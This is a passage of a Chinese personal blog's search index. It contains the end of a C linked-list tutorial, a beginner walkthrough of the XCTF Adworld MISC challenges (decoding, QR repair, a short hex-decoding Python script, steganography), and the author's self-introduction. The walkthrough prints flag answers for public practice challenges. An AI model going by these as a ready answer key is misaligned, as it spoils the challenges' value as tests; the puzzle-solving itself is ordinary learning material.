tempi++)        pre = pre-&gt;next;                 //查找第i个位置的前驱结点     Node *p;                                //插入的结点为p    p = (Node *)malloc(sizeof(Node));    p-&gt;data = x;     p-&gt;next = pre-&gt;next;    pre-&gt;next = p;    return L;                           }   </code></pre><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><p>对于删除一段链表，我们需要借助两个辅助链表分别指向被删除段和被删除段的前一段，然后让链表重新指过去就好了。</p><pre><code class="C++"> LinkedList LinkedListDelete(LinkedList L,ElemType x){    Node *p,*pre;                   //pre为前驱结点，p为查找的结点。     p = L-&gt;next;    while(p-&gt;data != x)              //查找值为x的元素     {           pre = p;         p = p-&gt;next;    }    pre-&gt;next = p-&gt;next;          //删除操作，将其前驱next指向其后继。     free(p);    return L;}   </code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>在之后的章节，我会使用new代替malloc函数，并使用一些很简单的C++语句，习惯问题，大家理解。</p>]]></content>
    
    
    <categories>
      
      <category>数据结构与算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界 MISC 新手村攻略</title>
    <link href="/2020/03/10/hello-world/"/>
    <url>/2020/03/10/hello-world/</url>
    
    <content type="html"><![CDATA[<blockquote><p>作为一名逆向手，MISC之前看别人做一直感觉好玩但没碰过(此前一直羡慕队里的MISC手），真正做起来感觉这玩意还是挺烧脑的，脑洞不够的我着实玩不起/xk/xk</p></blockquote><p>题目地址： <a href="https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0&amp;page=1" target="_blank" rel="noopener">https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0&amp;page=1</a></p><h2 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h2><p>签到题，flag题干直接给了</p><h2 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h2><p>题干中提到图片下面什么都没有，所以我们把图片移走就好了，flag在下面</p><p>这题大佬们似乎都用的PDF编辑器，我这种业余玩家是把PDF转成word来弄的，实现此功能有个靠谱的网站：<br><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">https://app.xunjiepdf.com/pdf2word/</a></p><h2 id="give-you-flag"><a href="#give-you-flag" class="headerlink" title="give_you_flag"></a>give_you_flag</h2><p>动态图按贞分解发现了疑似二维码，但是这个二维码好像缺了点什么。。<br><img src="https://s2.ax1x.com/2020/03/10/8CjHe0.png" srcset="/img/loading.gif" alt="8CjHe0.png" border="0" /><br>拿个正常二维码对比一下，发现是少了三个角，修复之后如下：<br><a href="https://imgchr.com/i/8CvLnI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/03/10/8CvLnI.th.png" srcset="/img/loading.gif" alt="8CvLnI.png" border="0" /></a><br>扫描得flag</p><h2 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h2><p>与佛论禅编码，发现疑似base64，但是解不开，考虑到题干中有13，于是想到了rot13，rot13后再进行base64解码，推荐一个网站： <a href="http://ctf.ssleye.com/" target="_blank" rel="noopener">http://ctf.ssleye.com/</a> ，可以实现大部分简单编码、密码加解密。</p><p>flag{bdscjhbkzmnfrdhbvckijndskvbkjdsab}</p><h2 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h2><p>黑白图片，进行白为0黑为1的转换得到：01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101<br>二进制转字符串，仍然可以使用上面的网页完成</p><p>flag{FuN_giF}</p><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p>菜鸡终于看见一道属于自己的本职工作了（得以嘲讽队内MISC大佬们）<br>jar文件，jd-gui直接看源码就行<br><img src="https://s2.ax1x.com/2020/03/10/8CxhKs.png" srcset="/img/loading.gif" alt="8CxhKs.png" border="0" /></p><h2 id="掀桌子"><a href="#掀桌子" class="headerlink" title="掀桌子"></a>掀桌子</h2><p>一串16进制数，按ascii码分析，感觉这些数都太大了，突然发现每个数-0x80之后都在可见字符范围内，python脚本给上：</p><pre><code class="python">string = &quot;c8e9aca0c6f2e5f3e8c4efe7a1a0d4e8e5a0e6ece1e7a0e9f3baa0e8eafae3f9e4eafae2eae4e3eaebfaebe3f5e7e9f3e4e3e8eaf9eaf3e2e4e6f2&quot;flag = &#39;&#39;for i in range(0,len(string), 2):    s = &quot;0x&quot; + string[i] + string[i+1]    flag += chr(int(s, 16) - 0x80)print(flag)</code></pre><h2 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h2><p>linux映像文件，ubuntu导入映像，翻文件翻到flag（ls，cd，cat大法）</p><h2 id="stegano"><a href="#stegano" class="headerlink" title="stegano"></a>stegano</h2><p>用记事本打开看到一堆AB，疑似摩尔斯电码，转化发现flag</p><h2 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h2><p>涉及到base64隐写问题，看大佬分析吧<a href="https://blog.csdn.net/zz_Caleb/article/details/89298335" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/89298335</a></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>还有两道题没做，以后再补吧（又鸽了）。话说MISC确实很好玩，不过我也是菜，几道入门题玩了这么长时间。。。以后有时间还会继续玩的</p>]]></content>
    
    
    <categories>
      
      <category>CTF题目浮现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息安全</tag>
      
      <tag>MISC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>个人简介</title>
    <link href="/2020/03/09/myself/"/>
    <url>/2020/03/09/myself/</url>
    
    <content type="html"><![CDATA[<blockquote><p>这是我的新博客，之前的博客因为一直没更就放弃了，这次希望能坚持做下去</p></blockquote><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>一名末流985学校的菜鸡，计算机专业学生，软件开发爱好者，信息安全爱好者，重点方向是逆向工程。</p><h2 id="准备写点什么"><a href="#准备写点什么" class="headerlink" title="准备写点什么"></a>准备写点什么</h2><p>程序开发、算法、CTF、以及一些奇怪的东西。</p><h2 id="近期计划"><a href="#近期计划" class="headerlink" title="近期计划"></a>近期计划</h2><p>准备先移植一下之前在各平台发的文章之类的，会不定期更一些数据结构和信息安全内容。</p><h2 id="单人博客？"><a href="#单人博客？" class="headerlink" title="单人博客？"></a>单人博客？</h2><p>会考虑让几个有想法的同学加入进来，做出一个优秀的IT博客，目前欢迎网络、软件开发、二进制、数学爱好者加入。</p><h2 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h2><p>我的邮箱：<a href="mailto:dyn201885095@gmail.com">dyn201885095@gmail.com</a></p><h2 id="未来"><a href="#未来" class="headerlink" title="未来"></a>未来</h2><p>fun in everything</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
